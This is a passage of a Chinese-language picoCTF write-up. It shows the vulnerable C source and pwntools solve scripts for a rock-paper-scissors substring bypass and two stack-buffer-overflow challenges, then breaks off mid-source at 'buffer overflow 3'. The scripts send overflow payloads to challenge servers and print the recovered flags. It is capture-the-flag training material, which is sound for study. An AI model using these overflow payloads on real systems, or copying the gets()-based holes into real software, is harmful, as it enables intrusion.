<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT 60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* flag = <span class="string">&quot;[REDACTED]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* hands[<span class="number">3</span>] = &#123;<span class="string">&quot;rock&quot;</span>, <span class="string">&quot;paper&quot;</span>, <span class="string">&quot;scissors&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span>* loses[<span class="number">3</span>] = &#123;<span class="string">&quot;paper&quot;</span>, <span class="string">&quot;scissors&quot;</span>, <span class="string">&quot;rock&quot;</span>&#125;;</span><br><span class="line"><span class="type">int</span> wins = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tgetinput</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    fd_set          input_set;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>  <span class="title">timeout</span>;</span></span><br><span class="line">    <span class="type">int</span>             ready_for_reading = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>             read_bytes = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( l &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&#x27;l&#x27; for tgetinput must be greater than 0\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Empty the FD Set */</span></span><br><span class="line">    FD_ZERO(&amp;input_set );</span><br><span class="line">    <span class="comment">/* Listen to the input descriptor */</span></span><br><span class="line">    FD_SET(STDIN_FILENO, &amp;input_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Waiting for some seconds */</span></span><br><span class="line">    timeout.tv_sec = WAIT;    <span class="comment">// WAIT seconds</span></span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;    <span class="comment">// 0 milliseconds</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Listening for input stream for any activity */</span></span><br><span class="line">    ready_for_reading = select(<span class="number">1</span>, &amp;input_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line">    <span class="comment">/* Here, first parameter is number of FDs in the set, </span></span><br><span class="line"><span class="comment">     * second is our FD set for reading,</span></span><br><span class="line"><span class="comment">     * third is the FD set in which any write activity needs to updated,</span></span><br><span class="line"><span class="comment">     * which is not required in this case. </span></span><br><span class="line"><span class="comment">     * Fourth is timeout</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Some error has occured in input */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read your input\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading) &#123;</span><br><span class="line">        read_bytes = read(<span class="number">0</span>, input, l<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(input[read_bytes<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        --read_bytes;</span><br><span class="line">        input[read_bytes]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(read_bytes==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No data given.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">play</span> <span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> player_turn[<span class="number">100</span>];</span><br><span class="line">  srand(time(<span class="number">0</span>));</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please make your selection (rock/paper/scissors):\n&quot;</span>);</span><br><span class="line">  r = tgetinput(player_turn, <span class="number">100</span>);</span><br><span class="line">  <span class="comment">// Timeout on user input</span></span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> computer_turn = rand() % <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You played: %s\n&quot;</span>, player_turn);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The computer played: %s\n&quot;</span>, hands[computer_turn]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(player_turn, loses[computer_turn])) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You win! Play again?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Seems like you didn&#x27;t win this time. Play again?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">3</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">  <span class="type">int</span> command;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you ready?&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;1&#x27; to play a game&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;2&#x27; to exit the program&quot;</span>);</span><br><span class="line">    r = tgetinput(input, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">// Timeout on user input</span></span><br><span class="line">    <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((command = strtol(input, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid number&quot;</span>);</span><br><span class="line">      </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (play()) &#123;</span><br><span class="line">        wins++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wins = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wins &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congrats, here&#x27;s the flag!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(flag);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please type either 1 or 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意程序对用户输入的处理方式，是找到用户输入字符串中是否有’rock’，‘paper’，‘scissors’。也就是说如果输入’rockpaperscissors’就无论如何都能赢。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">51420</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Type \&#x27;2\&#x27; to exit the program&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Please make your selection (rock/paper/scissors):&#x27;</span>,</span><br><span class="line">		 	<span class="string">b&#x27;rockpaperscissors&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Type \&#x27;2\&#x27; to exit the program&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please make your selection (rock/paper/scissors):&#x27;</span>,</span><br><span class="line">		 	<span class="string">b&#x27;rockpaperscissors&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Type \&#x27;2\&#x27; to exit the program&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}</p>
<h2 id="6-x-sixty-what"><a class="markdownIt-Anchor" href="#6-x-sixty-what"></a> 6. x-sixty-what</h2>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFFSIZE];</span><br><span class="line">  gets(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>64位的栈溢出，前面的是32位的。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">49518</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to 64-bit. Give me a string that gets you the flag: &#x27;</span>, </span><br><span class="line">	cyclic(<span class="number">64</span> + <span class="number">8</span>) + p64(<span class="number">0x40123B</span>))</span><br><span class="line">	</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{b1663r_15_b3773r_11c407bc}</p>
<h2 id="7-buffer-overflow-2"><a class="markdownIt-Anchor" href="#7-buffer-overflow-2"></a> 7. buffer overflow 2</h2>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> arg1, <span class="type">unsigned</span> <span class="type">int</span> arg2)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f);</span><br><span class="line">  <span class="keyword">if</span> (arg1 != <span class="number">0xCAFEF00D</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (arg2 != <span class="number">0xF00DF00D</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your string: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要传入两个正确的参数，注意一个函数的栈空间从低地址到高地址依次为：变量区、ebp/rbp、返回地址。需要将返回地址覆盖为win函数的起始地址，之后从逻辑上应该是win函数的返回地址，再之后才是win函数的参数。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(b&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">65430</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please enter your string: &#x27;</span>, cyclic(<span class="number">112</span>) + p32(<span class="number">0x8049296</span>) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xCAFEF00D</span>) + p32(<span class="number">0xF00DF00D</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{argum3nt5_4_d4yZ_b3fd8f66}</p>
<h2 id="8-buffer-overflow-3"><a class="markdownIt-Anchor" href="#8-buffer-overflow-3"></a> 8. buffer overflow 3</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CANARY_SIZE 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span 